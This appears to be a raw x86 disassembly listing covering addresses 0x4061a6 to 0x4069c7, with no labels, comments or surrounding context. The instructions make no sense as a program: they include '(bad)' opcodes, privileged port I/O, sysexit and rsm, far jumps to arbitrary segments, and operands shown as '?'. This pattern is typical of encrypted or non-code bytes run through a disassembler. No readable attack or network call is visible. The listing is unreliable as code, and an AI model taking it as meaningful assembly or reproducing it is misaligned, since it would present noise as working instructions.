  4061a6:	aaa    
  4061a7:	int    0x2d
  4061a9:	sbb    cl,BYTE PTR [edx+0x410044f6]
  4061af:	hlt    
  4061b0:	adc    BYTE PTR [ecx+0x18539880],bh
  4061b6:	dec    ebp
  4061b7:	pusha  
  4061b8:	stos   BYTE PTR es:[edi],al
  4061b9:	loop   0x40622f
  4061bb:	cmp    BYTE PTR [ebp+0x2d],0xd2
  4061bf:	cmp    BYTE PTR [edx+0x6d],0x49
  4061c3:	mov    edi,0xbe7b1795
  4061c8:	mov    ah,0x6a
  4061ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061cb:	sbb    BYTE PTR [eax],ah
  4061cd:	imul   ecx
  4061cf:	or     DWORD PTR [ebp+0x5b828623],ebx
  4061d5:	shl    DWORD PTR [ecx+0x4bb97a52],1
  4061db:	je     0x4061c0
  4061dd:	push   eax
  4061de:	lods   al,BYTE PTR ds:[esi]
  4061df:	add    ah,BYTE PTR [ebx+0x9]
  4061e2:	adc    al,0xc6
  4061e4:	dec    edx
  4061e5:	ror    BYTE PTR [edx],cl
  4061e7:	popa   
  4061e8:	retf   0x6e5f
  4061eb:	ja     0x4061de
  4061ed:	les    ecx,FWORD PTR [ebp-0x35721f19]
  4061f3:	inc    eax
  4061f4:	pop    ebx
  4061f5:	inc    eax
  4061f6:	xchg   ecx,eax
  4061f7:	popf   
  4061f8:	cmp    edi,edx
  4061fa:	pop    eax
  4061fb:	addr16 (bad) 
  4061fe:	in     al,dx
  4061ff:	sub    eax,0x338aae88
  406204:	mov    esi,0x2980c99d
  406209:	out    0x0,eax
  40620b:	loope  0x406190
  40620d:	mov    ecx,0x4fe0079d
  406212:	dec    DWORD PTR [edi+0x36]
  406215:	xchg   ebp,eax
  406216:	out    0x32,al
  406218:	mov    dl,0x54
  40621a:	in     al,dx
  40621b:	call   0xf648e5a1
  406220:	lahf   
  406221:	push   esi
  406222:	js     0x4061ac
  406224:	jb     0x4061b9
  406226:	mov    ds:0xe1851149,eax
  40622b:	xchg   edx,eax
  40622c:	inc    eax
  40622d:	mov    dh,BYTE PTR [ebx]
  40622f:	lahf   
  406230:	pop    edx
  406231:	ins    DWORD PTR es:[edi],dx
  406232:	xchg   edi,eax
  406233:	cdq    
  406234:	lock and BYTE PTR [ecx-0x20d6ad3f],bl
  40623b:	cmp    ebp,DWORD PTR [edi-0x175ae533]
  406241:	cwde   
  406242:	fsubrp st(4),st
  406244:	cmc    
  406245:	mov    ds:0xde92493b,al
  40624a:	mov    eax,ds:0xa903d8e3
  40624f:	or     eax,0x2ec8e512
  406254:	jmp    0x692e:0x778166cf
  40625b:	stos   DWORD PTR es:[edi],eax
  40625c:	pop    ecx
  40625d:	mov    eax,0x532fb2d
  406262:	stos   DWORD PTR es:[edi],eax
  406263:	jl     0x40628c
  406265:	into   
  406266:	sbb    eax,0x31d0669e
  40626b:	(bad)  
  40626c:	jmp    0xab8e:0xa542e26
  406273:	imul   edi,esp,0x4899591b
  406279:	ror    al,cl
  40627b:	outs   dx,DWORD PTR ds:[esi]
  40627c:	or     BYTE PTR [ebx-0x5],bl
  40627f:	cmp    esp,DWORD PTR [ebx+0x61b264cc]
  406285:	stos   BYTE PTR es:[edi],al
  406286:	dec    esp
  406287:	rcl    DWORD PTR [edx+0x5b],0x6e
  40628b:	stos   BYTE PTR es:[edi],al
  40628c:	popf   
  40628d:	push   eax
  40628e:	stos   BYTE PTR es:[edi],al
  40628f:	xchg   ebx,eax
  406290:	ins    DWORD PTR es:[edi],dx
  406291:	xchg   ebp,eax
  406292:	xor    al,0xf2
  406294:	scas   eax,DWORD PTR es:[edi]
  406295:	adc    BYTE PTR ds:0x8b5397a,dl
  40629b:	gs int 0xa
  40629e:	out    0x34,eax
  4062a0:	pop    ebx
  4062a1:	stc    
  4062a2:	(bad)  
  4062a4:	sub    bl,BYTE PTR ds:0x19447817
  4062aa:	repz (bad) [ecx]
  4062ad:	leave  
  4062ae:	push   ds
  4062af:	cmp    ch,0x19
  4062b2:	pop    ecx
  4062b3:	and    BYTE PTR [esi-0x14],ah
  4062b6:	in     al,dx
  4062b7:	(bad)  
  4062b8:	(bad)  
  4062b9:	rcr    eax,1
  4062bb:	inc    esi
  4062bc:	mov    bh,0x6b
  4062be:	daa    
  4062bf:	pop    edi
  4062c0:	mov    WORD PTR ds:0x5c772069,gs
  4062c6:	ret    0x8a9a
  4062c9:	imul   edi,DWORD PTR [eax],0xd68ccc5a
  4062cf:	or     al,0xe3
  4062d1:	sbb    eax,0x1d843cae
  4062d6:	clc    
  4062d7:	xchg   esi,eax
  4062d8:	cmp    eax,DWORD PTR [esi+ebx*1-0x2e]
  4062dc:	fucom  st(5)
  4062de:	or     al,0xec
  4062e0:	cmp    DWORD PTR ds:0xf1b8c05c,0x94b01b36
  4062ea:	xchg   ebp,eax
  4062eb:	inc    edi
  4062ec:	fsubr  DWORD PTR [edi+ebp*1]
  4062ef:	mov    edi,0x8cf5f9d6
  4062f4:	push   ebx
  4062f5:	fwait
  4062f6:	retf   0x9fd5
  4062f9:	(bad)  
  4062fb:	outs   dx,BYTE PTR ds:[esi]
  4062fc:	aaa    
  4062fd:	pop    edx
  4062fe:	mov    ecx,0x1918b746
  406303:	loope  0x406321
  406305:	sub    dh,BYTE PTR [edi+0x5060f2b5]
  40630b:	ss scas eax,DWORD PTR es:[edi]
  40630d:	aam    0xc1
  40630f:	jnp    0x406358
  406311:	add    eax,0x3990136b
  406316:	cmp    eax,0xd50c5644
  40631b:	fild   QWORD PTR [eax-0x2a]
  40631e:	je     0x4062e9
  406320:	adc    esp,ebp
  406322:	sbb    DWORD PTR [esi+0x1b],ebp
  406325:	aaa    
  406326:	pop    ss
  406327:	jo     0x4062e6
  406329:	pushf  
  40632a:	cmp    dh,ch
  40632c:	jbe    0x4062c9
  40632e:	adc    al,0xd9
  406330:	sbb    ecx,DWORD PTR [ebp+0x7e5f9f7b]
  406336:	add    bl,al
  406338:	push   ss
  406339:	clc    
  40633a:	sbb    eax,0xf542dd56
  40633f:	dec    edi
  406340:	dec    ecx
  406341:	mov    ds:0x7e94d697,eax
  406346:	int    0xb5
  406348:	ret    0xa50e
  40634b:	out    0xf,al
  40634d:	addr16 xchg ecx,eax
  40634f:	xor    BYTE PTR [ebx-0x69f93a37],al
  406355:	test   eax,0xabe12469
  40635a:	stos   DWORD PTR es:[edi],eax
  40635b:	addr16 inc ebp
  40635d:	lea    edx,[edx-0x24dbe39f]
  406363:	lahf   
  406364:	call   0x385c:0x1a57069e
  40636b:	mov    bl,BYTE PTR [edi+0x29]
  40636e:	imul   ebx,DWORD PTR ds:0xa91a425c,0x8407ae40
  406378:	int3   
  406379:	repnz pop ss
  40637b:	mov    ah,0x73
  40637d:	adc    ebx,edx
  40637f:	mov    esi,ecx
  406381:	mov    edx,0x876554fe
  406386:	jp     0x406315
  406388:	fcomp  QWORD PTR [ecx]
  40638a:	jae    0x406347
  40638c:	dec    ebx
  40638d:	push   0x7b
  40638f:	and    cl,BYTE PTR [eax-0x2]
  406392:	push   0x69
  406394:	and    eax,0x11c5f533
  406399:	mov    dh,0xe9
  40639b:	lahf   
  40639c:	sbb    DWORD PTR [ecx+0x79],esp
  40639f:	fldenv [ebp+0x1d]
  4063a2:	mov    ?,WORD PTR [esi+0x27]
  4063a5:	mov    WORD PTR [edi],?
  4063a7:	in     eax,dx
  4063a8:	shl    DWORD PTR [ebp+0x71],0xed
  4063ac:	cwde   
  4063ad:	xor    esi,DWORD PTR [edi+0x2c84e187]
  4063b3:	(bad)  
  4063b4:	jne    0x4063ca
  4063b6:	test   al,0x66
  4063b8:	sti    
  4063b9:	je     0x406388
  4063bb:	cld    
  4063bc:	mov    al,0x8c
  4063be:	dec    edx
  4063bf:	xlat   BYTE PTR ds:[ebx]
  4063c0:	loopne 0x4063a6
  4063c2:	shl    DWORD PTR [ebp-0x7c],1
  4063c5:	mov    esp,0x80be77c1
  4063ca:	ja     0x406350
  4063cc:	mov    edx,0x72b79ba1
  4063d1:	push   ss
  4063d2:	sbb    ch,BYTE PTR [edi-0x234618f5]
  4063d8:	fidiv  WORD PTR [esi-0x11]
  4063db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063dc:	jne    0x4063ab
  4063de:	push   cs
  4063df:	lock xor BYTE PTR [eax-0x6f],dh
  4063e3:	add    al,BYTE PTR [eax+0x72b47285]
  4063e9:	xor    eax,0x1629dc88
  4063ee:	test   eax,0xdf85a716
  4063f3:	loope  0x406460
  4063f5:	mov    esi,DWORD PTR [edx+0x6b]
  4063f8:	imul   ebp,DWORD PTR [eax+ebx*4-0x24],0x535f072d
  406400:	add    eax,DWORD PTR [ecx+edx*8+0xc]
  406404:	lds    ecx,FWORD PTR [esi-0x179117c4]
  40640a:	aad    0x40
  40640c:	cmc    
  40640d:	xchg   edx,eax
  40640e:	xchg   DWORD PTR [eax],ecx
  406410:	shl    BYTE PTR [edi],cl
  406412:	ret    
  406413:	sub    ah,bh
  406415:	mov    BYTE PTR [edi-0x2cde5e79],0x4
  40641c:	rcr    DWORD PTR [ebp+0x344d5806],0xd
  406423:	mov    ebx,0x9126b756
  406428:	clc    
  406429:	sub    al,0xc7
  40642b:	jle    0x406451
  40642d:	ss ret 
  40642f:	ret    0x8ce4
  406432:	lahf   
  406433:	mov    dl,0x2a
  406435:	loop   0x406492
  406437:	in     al,dx
  406438:	mov    esp,0x73fc3ea1
  40643d:	push   es
  40643e:	add    dh,ch
  406440:	push   ebx
  406441:	js     0x40646f
  406443:	mov    ch,0x3f
  406445:	cmp    eax,0xa7371e66
  40644a:	iret   
  40644b:	pop    edx
  40644c:	call   esp
  40644e:	lahf   
  40644f:	das    
  406450:	mov    cl,0x5a
  406452:	jp     0x406487
  406454:	or     DWORD PTR [eax+eax*2+0x7],esp
  406458:	clc    
  406459:	lock hlt 
  40645b:	mov    ebx,0x912cbfc0
  406460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406461:	jb     0x406472
  406463:	ins    DWORD PTR es:[edi],dx
  406464:	loope  0x40648e
  406466:	sti    
  406467:	adc    DWORD PTR [edi],0x8
  40646a:	xchg   BYTE PTR [eax],ah
  40646c:	lahf   
  40646d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40646e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40646f:	cmp    BYTE PTR [ebx+0x604ef7e5],0x47
  406476:	repnz sub DWORD PTR [ecx],eax
  406479:	not    DWORD PTR [edx+ebp*8-0x5ed5c72a]
  406480:	add    BYTE PTR [edx],0x1
  406483:	ficomp DWORD PTR [eax-0x3c457a25]
  406489:	rcl    cl,cl
  40648b:	cwde   
  40648c:	mov    BYTE PTR [esi],al
  40648e:	pop    esi
  40648f:	xlat   BYTE PTR ds:[ebx]
  406490:	fisubr WORD PTR [ebx+0x79e188af]
  406496:	clc    
  406497:	pop    ecx
  406498:	enter  0x271a,0xda
  40649c:	std    
  40649d:	inc    edi
  40649e:	call   0x14d3:0x9420702b
  4064a5:	test   eax,0x7bd3dc69
  4064aa:	jnp    0x40648a
  4064ac:	fdiv   st(0),st
  4064ae:	fimul  DWORD PTR [eax]
  4064b0:	ret    
  4064b1:	sub    DWORD PTR [edi-0x9a20af0],edi
  4064b7:	mov    edx,0xa0ad5ee7
  4064bc:	fnstsw WORD PTR [eax+0x6]
  4064bf:	add    DWORD PTR [ebp*2-0x5c334e34],0xa70dde64
  4064ca:	aad    0xa2
  4064cc:	pop    ss
  4064cd:	sub    esp,0x2fcf501b
  4064d3:	ret    
  4064d4:	jmp    0xccb0:0xc254e96b
  4064db:	dec    edx
  4064dc:	mov    esi,0x3dff4fb2
  4064e1:	in     eax,0x28
  4064e3:	mov    eax,ds:0xb8d21548
  4064e8:	adc    eax,esi
  4064ea:	sti    
  4064eb:	addr16 xchg edx,eax
  4064ed:	mov    ecx,0x8ce0a0e3
  4064f2:	and    DWORD PTR [ebx+0x1c],esi
  4064f5:	cmc    
  4064f6:	aam    0x29
  4064f8:	les    ecx,FWORD PTR [ebx-0x24]
  4064fb:	and    al,bl
  4064fd:	fs test al,0xad
  406500:	dec    ecx
  406501:	stos   BYTE PTR es:[edi],al
  406502:	pop    ebx
  406503:	icebp  
  406504:	adc    eax,0xadc3e9c6
  406509:	inc    edi
  40650a:	adc    al,0xba
  40650c:	add    DWORD PTR [ebx],eax
  40650e:	jo     0x40658f
  406510:	xchg   edi,eax
  406511:	lods   eax,DWORD PTR ds:[esi]
  406512:	push   0x21
  406514:	jb     0x406526
  406516:	push   edx
  406517:	push   cs
  406518:	dec    ebp
  406519:	mov    dh,0xf0
  40651b:	shl    dh,cl
  40651d:	add    al,0x98
  40651f:	mov    eax,ds:0x8b9b2c2e
  406524:	cmp    eax,0x3b6cf1c1
  406529:	and    BYTE PTR [ebx],bl
  40652b:	inc    edi
  40652c:	not    DWORD PTR [edx]
  40652e:	stos   DWORD PTR es:[edi],eax
  40652f:	dec    ecx
  406530:	cld    
  406531:	mov    BYTE PTR [ecx-0x61ed6e91],cl
  406537:	aam    0xc9
  406539:	mov    ecx,0x12ad404f
  40653e:	sub    bl,BYTE PTR [esi-0x3919810a]
  406544:	jp     0x40650c
  406546:	lds    esi,FWORD PTR [ebp+esi*2-0x58]
  40654a:	mov    cl,0x6c
  40654c:	adc    edx,ebp
  40654e:	push   cs
  40654f:	iret   
  406550:	mov    edi,0xcc197b65
  406555:	cmp    al,0x2a
  406557:	push   eax
  406558:	cmp    eax,0x51fe0cbc
  40655d:	dec    ebx
  40655e:	sbb    DWORD PTR [eax*2-0x5e6701f3],edx
  406565:	sbb    al,BYTE PTR [ebp+0xd]
  406568:	xchg   edx,eax
  406569:	push   ecx
  40656a:	inc    ebp
  40656b:	sub    DWORD PTR [ecx],esp
  40656d:	repz sub edx,DWORD PTR [ecx+0x2f7229f8]
  406574:	dec    edx
  406575:	cwde   
  406576:	mov    ecx,0xac4135fa
  40657b:	fdivr  DWORD PTR ds:0xdf9c83e5
  406581:	add    DWORD PTR [ebp+ebx*2+0x79],edx
  406585:	out    0x64,al
  406587:	push   ebp
  406588:	clc    
  406589:	sysexit 
  40658b:	ds xchg edi,eax
  40658d:	sbb    dl,BYTE PTR [edx-0x374a8d7f]
  406593:	mov    edi,0x22c9815f
  406598:	mov    edx,0x6afc0411
  40659d:	xchg   BYTE PTR [eax+eax*1+0xb],cl
  4065a1:	lea    ecx,[edi-0x51]
  4065a4:	cmp    BYTE PTR [edi-0x26],dl
  4065a7:	sbb    BYTE PTR [edx+0x61ed0edf],ch
  4065ad:	jns    0x406604
  4065af:	jo     0x406568
  4065b1:	test   eax,0x2adc829
  4065b6:	in     al,0x7a
  4065b8:	sub    al,0xbf
  4065ba:	adc    eax,0xd6276ca1
  4065bf:	mov    edi,0xf512394
  4065c4:	imul   ebx,DWORD PTR [ebp-0x6a],0x2bc87461
  4065cb:	loope  0x4065cf
  4065cd:	in     eax,0xf3
  4065cf:	shl    eax,cl
  4065d1:	push   esp
  4065d2:	xchg   ebx,eax
  4065d3:	push   es
  4065d4:	pop    ebp
  4065d5:	loope  0x406567
  4065d7:	pop    esp
  4065d8:	out    0x4c,eax
  4065da:	or     al,0xfc
  4065dc:	pop    ebp
  4065dd:	push   cs
  4065de:	dec    ecx
  4065df:	sbb    edi,DWORD PTR [ecx]
  4065e1:	push   ds
  4065e2:	out    0x86,al
  4065e4:	loope  0x40663b
  4065e6:	xor    DWORD PTR [ebp-0x3],esp
  4065e9:	dec    ebx
  4065ea:	lods   al,BYTE PTR ds:[esi]
  4065eb:	rcr    BYTE PTR gs:[esp+edx*1+0x3841c80e],cl
  4065f3:	out    0x61,eax
  4065f5:	mov    edx,0x96607012
  4065fa:	mov    WORD PTR [ebx+0x5b],ds
  4065fd:	lds    ebx,FWORD PTR [edx]
  4065ff:	push   ds
  406600:	push   esi
  406601:	ret    
  406602:	xchg   ebx,eax
  406603:	push   ebp
  406604:	outs   dx,DWORD PTR ds:[esi]
  406605:	mul    DWORD PTR [edx]
  406607:	or     eax,ebp
  406609:	xchg   ebp,eax
  40660a:	pop    ebp
  40660b:	push   edx
  40660c:	inc    edx
  40660d:	sub    ebx,DWORD PTR ds:0x87e0d161
  406613:	dec    edi
  406614:	loop   0x406620
  406616:	or     al,bh
  406618:	lock mov ebx,0x3f7e07f3
  40661e:	or     dh,0x59
  406621:	mov    al,ds:0x8c235520
  406626:	mul    DWORD PTR [edx]
  406628:	hlt    
  406629:	sahf   
  40662a:	sbb    bh,bh
  40662c:	cli    
  40662d:	nop
  40662e:	xchg   ebp,eax
  40662f:	xor    ebx,DWORD PTR [edx]
  406631:	lods   al,BYTE PTR ds:[esi]
  406632:	mov    ebx,0x45a88a6b
  406637:	xchg   ecx,eax
  406638:	dec    edi
  406639:	daa    
  40663a:	xor    ch,BYTE PTR [edx-0x14dc475]
  406640:	ret    0x176f
  406643:	iret   
  406644:	clc    
  406645:	int    0xeb
  406647:	sar    DWORD PTR [ecx-0x6cdb4e4f],0xd9
  40664e:	out    0xf8,eax
  406650:	out    dx,eax
  406651:	enter  0xd32d,0xbd
  406655:	fiadd  DWORD PTR [eax+edi*2-0x2f]
  406659:	dec    esp
  40665a:	mov    WORD PTR [ebx+0x3309d999],?
  406660:	(bad)  [ebp-0x32]
  406663:	fs retf 
  406665:	sub    BYTE PTR [ebx],bl
  406667:	lods   eax,DWORD PTR ds:[esi]
  406668:	fsubr  st,st(3)
  40666a:	xor    eax,ecx
  40666c:	inc    esp
  40666d:	mov    esi,0x1b0dee61
  406672:	in     al,0xb1
  406674:	lock mov bh,0xc5
  406677:	mov    edx,0x28b1b2af
  40667c:	or     al,0x79
  40667e:	sub    al,0x53
  406680:	ins    DWORD PTR es:[edi],dx
  406681:	call   0x5ce8:0x8cc41329
  406688:	nop
  406689:	inc    ecx
  40668a:	mov    al,ds:0xc0eba776
  40668f:	add    BYTE PTR [ecx+0x559e2506],cl
  406695:	mov    ah,0xa4
  406697:	xor    esp,edi
  406699:	je     0x4066b7
  40669b:	xchg   ebx,eax
  40669c:	mov    edi,0x45bd5260
  4066a1:	aad    0xbb
  4066a3:	lahf   
  4066a4:	cdq    
  4066a5:	mov    al,0x16
  4066a7:	mov    esp,0xf577e323
  4066ac:	scas   eax,DWORD PTR es:[edi]
  4066ad:	rsm    
  4066af:	dec    ecx
  4066b0:	push   ebp
  4066b1:	dec    ecx
  4066b2:	mov    ebx,0x9d44d662
  4066b7:	cmp    BYTE PTR [esi+ebx*4-0x75],al
  4066bb:	imul   eax,DWORD PTR [esi-0x10025af4],0xffffffed
  4066c2:	into   
  4066c3:	jmp    FWORD PTR [ebx+0x78a07364]
  4066c9:	mov    WORD PTR [ebx+ebx*4+0x390ccafd],es
  4066d0:	clc    
  4066d1:	aaa    
  4066d2:	adc    DWORD PTR [ecx-0x7b40a1a3],esp
  4066d8:	inc    esi
  4066d9:	not    edi
  4066db:	sub    al,0x82
  4066dd:	pushf  
  4066de:	push   0xcb6b3972
  4066e3:	aas    
  4066e4:	pop    esp
  4066e5:	push   edi
  4066e6:	xchg   edx,eax
  4066e7:	sbb    BYTE PTR [ebp-0x65],dl
  4066ea:	xor    esi,DWORD PTR [esi+0x5c]
  4066ed:	and    bh,BYTE PTR [edi+ebx*8]
  4066f0:	xor    edx,edx
  4066f2:	xor    al,0xff
  4066f4:	mov    esi,0xd2490ebd
  4066f9:	cmp    eax,0xa2504a6b
  4066fe:	cmp    ecx,DWORD PTR [eax]
  406700:	mov    edx,eax
  406702:	fnstcw WORD PTR [esi-0x30]
  406705:	add    DWORD PTR [ebx+0x34],0x3d
  406709:	sub    esp,DWORD PTR [edi]
  40670b:	loopne 0x406781
  40670d:	out    0xcb,eax
  40670f:	neg    BYTE PTR [ecx+0x404a1b3d]
  406715:	mov    BYTE PTR [edx+0x66],al
  406718:	imul   esp,DWORD PTR [eax],0xfc023b05
  40671e:	ins    BYTE PTR es:[edi],dx
  40671f:	xor    DWORD PTR ss:[esi+0x57],edi
  406723:	adc    ch,dl
  406725:	fld    TBYTE PTR [eax+0x5aaac397]
  40672b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40672d:	hlt    
  40672e:	dec    eax
  40672f:	and    BYTE PTR [eax+esi*2-0x7e],0xb9
  406734:	inc    edx
  406735:	loope  0x4066dc
  406737:	mov    al,ds:0x61a97d43
  40673c:	sub    DWORD PTR ds:0x72043eca,ebp
  406742:	rcr    DWORD PTR ds:0xfabc2373,1
  406748:	aas    
  406749:	sub    ah,BYTE PTR [edi-0x4c0528d0]
  40674f:	push   ecx
  406750:	pop    ebp
  406751:	in     al,0xba
  406753:	adc    DWORD PTR ds:0xe56a1c19,ecx
  406759:	inc    ecx
  40675a:	push   ebp
  40675b:	or     eax,DWORD PTR [esi]
  40675d:	xchg   esp,eax
  40675e:	and    al,0x63
  406760:	xor    eax,0x5c3c01a1
  406765:	jns    0x4066f3
  406767:	std    
  406768:	pop    edx
  406769:	sbb    DWORD PTR [ecx],0xffffffb6
  40676c:	inc    esi
  40676d:	ds mov cl,0x75
  406770:	mov    esp,0xd7bafe9d
  406775:	cmc    
  406776:	xor    edi,DWORD PTR [esi+0x770b995d]
  40677c:	push   eax
  40677d:	jae    0x4067c9
  40677f:	and    ecx,0xad0aafb5
  406785:	sbb    eax,0x4738e15d
  40678a:	into   
  40678b:	jl     0x406807
  40678d:	and    BYTE PTR [edi],al
  40678f:	fisubr WORD PTR [esi-0x69]
  406792:	jnp    0x4067e2
  406794:	dec    edi
  406795:	call   DWORD PTR gs:[eax+0x7988f1ae]
  40679c:	jle    0x406803
  40679e:	inc    ebp
  40679f:	cmp    al,0x36
  4067a1:	mov    BYTE PTR [edx],0x6f
  4067a4:	inc    ebx
  4067a5:	rcl    DWORD PTR [eax+0x65831e35],1
  4067ab:	es repnz mov dh,0xb8
  4067af:	aaa    
  4067b0:	nop
  4067b1:	jmp    FWORD PTR [esi-0x4afb54a8]
  4067b7:	mov    ebx,0x651babc1
  4067bc:	push   ebx
  4067bd:	mov    esp,0x40b8068b
  4067c2:	add    al,0x40
  4067c4:	mov    ebx,0x2dbc99eb
  4067c9:	add    BYTE PTR [esp+eiz*4-0x7d],bl
  4067cd:	mov    ?,WORD PTR [edi-0x4c]
  4067d0:	lahf   
  4067d1:	loopne 0x40683f
  4067d3:	push   cs
  4067d4:	and    eax,0x34d2836e
  4067d9:	and    eax,0xf521e86a
  4067de:	iret   
  4067df:	iret   
  4067e0:	or     ax,0x2126
  4067e4:	sahf   
  4067e5:	sbb    ch,BYTE PTR [ebp+0x6519022a]
  4067eb:	pop    edx
  4067ec:	cld    
  4067ed:	mov    eax,0x8a8be578
  4067f2:	mov    ?,WORD PTR [ebx]
  4067f4:	push   0xffffff89
  4067f6:	je     0x406782
  4067f8:	dec    ecx
  4067f9:	push   esp
  4067fa:	xchg   DWORD PTR [ebx+0x73f1707c],esp
  406800:	(bad)  
  406801:	stos   BYTE PTR es:[edi],al
  406802:	and    DWORD PTR [ebx+0x14460c06],ecx
  406808:	aaa    
  406809:	push   ss
  40680a:	mov    ecx,0x933f2d8b
  40680f:	lds    edi,FWORD PTR [eax]
  406811:	in     al,dx
  406812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406813:	and    DWORD PTR [eax+0x7c],ebx
  406816:	dec    bp
  406818:	mov    edi,0x5d6296cd
  40681d:	stos   BYTE PTR es:[edi],al
  40681e:	jnp    0x4067bb
  406820:	mov    al,0x39
  406822:	gs iret 
  406824:	rol    DWORD PTR [edi+edi*8],0x94
  406828:	lods   eax,DWORD PTR ds:[esi]
  406829:	xor    BYTE PTR [edi],dh
  40682b:	dec    ebx
  40682c:	nop
  40682d:	pop    es
  40682e:	into   
  40682f:	jne    0x4067f5
  406831:	push   ebx
  406832:	imul   esp,DWORD PTR [ebp+0x5cb4f2fb],0xffffffab
  406839:	push   ecx
  40683a:	mov    WORD PTR [edx],gs
  40683c:	js     0x40685b
  40683e:	xor    eax,0xa2d9a4df
  406843:	(bad)  
  406844:	ss addr16 pop ecx
  406847:	stos   DWORD PTR es:[edi],eax
  406848:	inc    ebp
  406849:	inc    esi
  40684a:	or     BYTE PTR [eax],bl
  40684c:	pop    esp
  40684d:	mov    ah,0x66
  40684f:	cmp    eax,DWORD PTR [ecx*8-0x6a97a3c6]
  406856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406857:	sub    al,0xd8
  406859:	aas    
  40685a:	scas   eax,DWORD PTR es:[edi]
  40685b:	mov    ebp,0x230e2299
  406860:	sti    
  406861:	inc    ebp
  406862:	dec    edi
  406863:	mov    ebx,0xd6446798
  406868:	adc    eax,0x79dbae8b
  40686d:	pop    ebx
  40686e:	add    BYTE PTR [ebp-0x57445bb6],bh
  406874:	ret    0x4c65
  406877:	add    bh,BYTE PTR [ebp+0x5cabe296]
  40687d:	mov    esp,0xec674d5b
  406882:	test   al,0xa3
  406884:	loope  0x4068ec
  406886:	mov    al,0xf6
  406888:	stos   DWORD PTR es:[edi],eax
  406889:	mov    al,0x28
  40688b:	sbb    eax,0xbe5c0f47
  406890:	rcr    eax,cl
  406892:	sbb    edx,esp
  406894:	mov    ds:0x8b3a6af5,al
  406899:	or     DWORD PTR ds:0xce005ea0,eax
  40689f:	cld    
  4068a0:	sti    
  4068a1:	sub    al,0x48
  4068a3:	fcomp  QWORD PTR [edi+0x49c304e2]
  4068a9:	pop    edi
  4068aa:	cmp    al,0xf6
  4068ac:	mov    bl,0xa2
  4068ae:	lea    edi,[eax-0x1c5ea56e]
  4068b4:	into   
  4068b5:	int    0xf7
  4068b7:	ror    esi,0x6a
  4068ba:	test   al,0xcf
  4068bc:	pusha  
  4068bd:	pop    ebx
  4068be:	dec    edi
  4068bf:	out    0xfe,eax
  4068c1:	das    
  4068c2:	or     eax,0xfa1b3175
  4068c7:	adc    al,0x83
  4068c9:	cmp    DWORD PTR [edx-0xd8b60ec],esp
  4068cf:	and    DWORD PTR [esi],edx
  4068d1:	pop    esi
  4068d2:	inc    ebp
  4068d3:	and    eax,0xa996330b
  4068d8:	call   ecx
  4068da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068db:	mov    dh,0x3f
  4068dd:	aaa    
  4068de:	fild   QWORD PTR [esi-0xe]
  4068e1:	add    esi,DWORD PTR [esp+ebx*2]
  4068e4:	jmp    0x21a5b790
  4068e9:	xor    eax,0xb3cf18f4
  4068ee:	mov    bl,BYTE PTR [ecx-0x40]
  4068f1:	adc    bl,BYTE PTR [edx-0x51]
  4068f4:	sti    
  4068f5:	out    0xd1,eax
  4068f7:	(bad)  
  4068f8:	jo     0x40694a
  4068fa:	into   
  4068fb:	loop   0x40691d
  4068fd:	jmp    0xc25:0x7095b947
  406904:	cld    
  406905:	test   al,0x5b
  406907:	mov    eax,0x2db99c16
  40690c:	xchg   ebp,eax
  40690d:	loopne 0x4068cb
  40690f:	xchg   ecx,eax
  406910:	jmp    0x40690f
  406912:	or     BYTE PTR [edi+0x5d],0xe0
  406916:	push   ebx
  406917:	mov    eax,0x6633aa56
  40691c:	ds ins BYTE PTR es:[edi],dx
  40691e:	loopne 0x406904
  406920:	and    dl,dh
  406922:	fmul   DWORD PTR [edx]
  406924:	scas   eax,DWORD PTR es:[edi]
  406925:	and    dh,BYTE PTR [eax]
  406927:	and    BYTE PTR [esi-0x9],cl
  40692a:	popa   
  40692b:	sahf   
  40692c:	sbb    bh,BYTE PTR [edx]
  40692e:	and    edi,DWORD PTR [edx+0xc]
  406931:	outs   dx,BYTE PTR ds:[esi]
  406932:	outs   dx,DWORD PTR ds:[esi]
  406933:	nop
  406934:	ret    0x96c9
  406937:	ins    DWORD PTR es:[edi],dx
  406938:	mov    cl,0x14
  40693a:	stc    
  40693b:	les    edi,FWORD PTR [ecx-0x3bed86d]
  406941:	xor    DWORD PTR [ebp-0x34],edx
  406944:	cmp    BYTE PTR [esi+eiz*8+0x5795b85b],dl
  40694b:	jno    0x4068f7
  40694d:	dec    BYTE PTR [ebp+0x4]
  406950:	sbb    BYTE PTR [ebx],al
  406952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406953:	push   ecx
  406954:	inc    eax
  406955:	leave  
  406956:	fisubr WORD PTR [edx+0x67]
  406959:	and    al,0x46
  40695b:	mov    edi,0x256883e0
  406960:	mov    edx,0x8b8b6db7
  406965:	imul   eax,DWORD PTR [edx+0x4caa2d96],0x5c638c04
  40696f:	push   es
  406970:	inc    esp
  406971:	or     DWORD PTR [ecx+0x1e],ebp
  406974:	js     0x4069b7
  406976:	jecxz  0x406951
  406978:	fs push eax
  40697a:	and    ch,BYTE PTR [ebp-0xe]
  40697d:	sbb    al,0x4a
  40697f:	lods   al,BYTE PTR ds:[esi]
  406980:	std    
  406981:	sbb    ecx,DWORD PTR [edx+0x6144adb6]
  406987:	mov    ds:0x82e4b90a,eax
  40698c:	icebp  
  40698d:	aas    
  40698e:	adc    DWORD PTR [ebx+edi*2+0x4c],edx
  406992:	or     eax,0x95c524b8
  406997:	mov    eax,0xf48bee24
  40699c:	fwait
  40699d:	sbb    eax,0xe2e2eacc
  4069a2:	js     0x4069c0
  4069a4:	xor    eax,0x934daf17
  4069a9:	mov    dh,BYTE PTR [ecx-0x30e274d7]
  4069af:	lods   al,BYTE PTR ds:[esi]
  4069b0:	or     al,0xef
  4069b2:	(bad)  [edx+edi*1]
  4069b5:	jmp    0x4a3437be
  4069ba:	cmp    bl,BYTE PTR [edx+0x18]
  4069bd:	or     DWORD PTR ds:0x81b5f41c,edi
  4069c3:	daa    
  4069c4:	inc    ecx
  4069c5:	sahf   
  4069c6:	out    dx,al
  4069c7:	into   
